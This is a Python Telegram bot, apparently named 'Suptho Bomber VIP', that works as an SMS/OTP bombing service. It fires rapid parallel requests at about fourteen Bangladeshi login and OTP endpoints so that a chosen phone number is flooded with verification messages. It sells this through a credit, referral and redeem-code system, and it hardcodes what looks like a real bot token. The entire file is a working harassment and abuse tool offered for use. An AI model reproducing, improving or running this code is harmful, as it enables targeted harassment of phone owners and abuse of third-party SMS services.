import telebot
import requests
import threading
import time
import json
import random
import string
import os
from flask import Flask
from telebot import types

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'   # BotFather theke ana token boshon
OWNER_ID = 6941003064              # Apnar numeric ID boshon
OWNER_USERNAME = "Suptho1"          
CHANNEL_ID = "@SH_tricks"           
DATA_FILE = 'bot_data.json'

bot = telebot.TeleBot(API_TOKEN)
stop_flags = {}

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "codes": [], "whitelist": [], "banned": []}
    try:
        with open(DATA_FILE, 'r') as f: return json.load(f)
    except: return {"users": {}, "codes": [], "whitelist": [], "banned": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🌐 WEB SERVER (Keep Alive)
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Turbo Engine Online"
def run_web_server():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
def keep_alive():
    threading.Thread(target=run_web_server, daemon=True).start()

# ==========================================
# 🚀 EXTREME SPEED API ENGINE (All Working APIs)
# ==========================================
def api_hit(url, method, data=None, json_data=None):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        if method == "POST":
            requests.post(url, data=data, json=json_data, headers=headers, timeout=2)
        else:
            requests.get(url, headers=headers, timeout=2)
    except: pass

def bombing_task(target, amount, call_id):
    global stop_flags
    stop_flags[call_id] = False
    sent = 0
    
    while sent < amount and not stop_flags.get(call_id, False):
        apis = [
            # OTT APIs
            lambda: api_hit(f"https://www.bioscopelive.com/en/login/send-otp?phone=88{target}", "GET"),
            lambda: api_hit("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", json_data={"number": "+88"+target}),
            lambda: api_hit(f"https://api.hoichoi.tv/users/otp?phone={target}&country_code=880", "GET"),
            # New Working APIs
            lambda: api_hit(f"https://api.shadhinmusic.com/api/v1/auth/otp?phone={target}", "GET"),
            lambda: api_hit(f"https://cineplexbd.com/api/v1/send-otp?phone={target}", "GET"),
            lambda: api_hit("https://api.metlife.com.bd/api/v1/otp/send", "POST", json_data={"mobile": target}),
            lambda: api_hit("https://api.retail.jatri.co/auth/api/v1/send-otp", "POST", json_data={"phone": target, "purpose": "USER_LOGIN"}),
            lambda: api_hit("https://api.swap.com.bd/api/v1/send-otp", "POST", json_data={"phone": target}),
            # Existing Working APIs
            lambda: api_hit("https://api.apex4u.com/api/auth/login", "POST", json_data={"phoneNumber": target}),
            lambda: api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json_data={"mobile": target}),
            lambda: api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET"),
            lambda: api_hit("https://prod-services.toffeelive.com/sms/v1/subscriber/otp", "POST", json_data={"target": "88"+target}),
            lambda: api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json_data={"phone": "88"+target, "type": "student"}),
            lambda: api_hit("https://api.osudpotro.com/api/v1/users/send_otp", "POST", json_data={"mobile": "+88-"+target})
        ]
        
        for api in apis:
            if sent >= amount or stop_flags.get(call_id, False): break
            threading.Thread(target=api).start() # Extreme Speed
            sent += 1
        
        # Super fast delivery-r jonno kono sleep nei

# ==========================================
# 🤖 BOT UI & HANDLERS
# ==========================================
def is_joined(user_id):
    try:
        status = bot.get_chat_member(CHANNEL_ID, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

@bot.message_handler(commands=['start'])
def welcome(message):
    uid = str(message.from_user.id)
    if uid not in db['users']:
        db['users'][uid] = {"credits": 5, "joined": True}
        save_data(db)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("🚀 Start Bomb"), types.KeyboardButton("💳 My Balance"))
    markup.add(types.KeyboardButton("👥 Refer & Earn"), types.KeyboardButton("💰 Redeem Credit"))
    markup.add(types.KeyboardButton("👑 Admin Support"))
    
    bot.send_message(message.chat.id, "🔥 **SUPTHO BOMBER VIP** 🔥\n\nAll APIs Updated (Chorki, Bioscope, Hoichoi, Metlife, Jatri Added).", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def handle_buttons(message):
    uid = str(message.from_user.id)
    if not is_joined(message.from_user.id):
        return bot.reply_to(message, f"❌ Age channel-e join korun: {CHANNEL_ID}")
    
    if uid in db['banned']: return bot.reply_to(message, "🚫 You are Banned.")

    if message.text == "🚀 Start Bomb":
        msg = bot.reply_to(message, "💣 Target number din (11 digit):")
        bot.register_next_step_handler(msg, ask_amount)
    elif message.text == "💳 My Balance":
        cred = "Unlimited" if int(uid) == OWNER_ID else db['users'].get(uid, {}).get('credits', 0)
        bot.reply_to(message, f"💰 Balance: **{cred} Credits**")
    elif message.text == "👥 Refer & Earn":
        link = f"https://t.me/{bot.get_me().username}?start={uid}"
        bot.reply_to(message, f"🎁 Refer Link: `{link}`")
    elif message.text == "💰 Redeem Credit":
        msg = bot.reply_to(message, "🎁 Redeem code din:")
        bot.register_next_step_handler(msg, use_redeem)
    elif message.text == "👑 Admin Support":
        bot.reply_to(message, f"Owner: @{OWNER_USERNAME}")

def ask_amount(message):
    target = message.text.strip()
    if len(target) != 11: return bot.reply_to(message, "⚠️ Incorrect number.")
    msg = bot.reply_to(message, f"🎯 Target: `{target}`\n🔢 Amount (Max 100):")
    bot.register_next_step_handler(msg, start_bombing, target)

def start_bombing(message, target):
    uid = str(message.from_user.id)
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        
        if int(uid) != OWNER_ID:
            if db['users'][uid]['credits'] < 1: return bot.reply_to(message, "⚠️ Credit nei.")
            db['users'][uid]['credits'] -= 1
            save_data(db)

        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⛔ STOP", callback_data=f"stop_{uid}"))
        bot.reply_to(message, f"🚀 Bombing started on `{target}`!", reply_markup=markup)
        
        threading.Thread(target=bombing_task, args=(target, amount, f"stop_{uid}")).start()
    except: bot.reply_to(message, "❌ Invalid Amount.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def stop_call(call):
    stop_flags[call.data] = True
    bot.edit_message_text("✅ Attack Stopped.", call.message.chat.id, call.message.message_id)

def use_redeem(message):
    code = message.text.strip()
    if code in db['codes']:
        db['codes'].remove(code)
        db['users'][str(message.from_user.id)]['credits'] += 5
        save_data(db)
        bot.reply_to(message, "✅ 5 Credits Added!")
    else: bot.reply_to(message, "❌ Invalid Code.")

# ==========================================
# 👑 ADMIN PANEL
# ==========================================
@bot.message_handler(commands=['admin', 'stats', 'gencodes'])
def handle_admin(message):
    if message.from_user.id != OWNER_ID: return
    cmd = message.text.split()
    if cmd[0] == '/admin':
        bot.reply_to(message, "👑 Admin Commands:\n/stats\n/gencodes <num>\n/addcredit <uid> <num>")
    elif cmd[0] == '/stats':
        bot.reply_to(message, f"📊 Users: {len(db['users'])}\n🎟️ Codes: {len(db['codes'])}")
    elif cmd[0] == '/gencodes':
        num = int(cmd[1])
        codes = ["SUP-"+''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) for _ in range(num)]
        db['codes'].extend(codes); save_data(db)
        bot.reply_to(message, f"✅ Codes: `{codes}`")

if __name__ == "__main__":
    try: bot.remove_webhook()
    except: pass
    keep_alive()
    bot.polling(non_stop=True)
